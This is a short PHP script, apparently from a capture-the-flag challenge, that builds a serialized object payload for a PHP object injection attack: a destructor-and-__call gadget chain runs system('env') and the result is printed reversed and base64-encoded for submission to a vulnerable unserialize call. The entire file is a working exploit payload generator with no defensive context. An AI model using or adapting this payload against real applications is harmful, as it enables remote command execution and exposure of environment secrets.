<?php
error_reporting(0);
include('utils.php');

class A {
    public $className="B";
    public $funcName="system";
    public $args="env";

    public function __destruct() {
        $class = new $this->className;
        $funcName = $this->funcName;
        $class->$funcName($this->args);
    }
}

class B {
    public function __call($func, $arg) {
        $func($arg[0]);
    }
}
$a = new A();

print(base64_encode(strrev(serialize($a))));


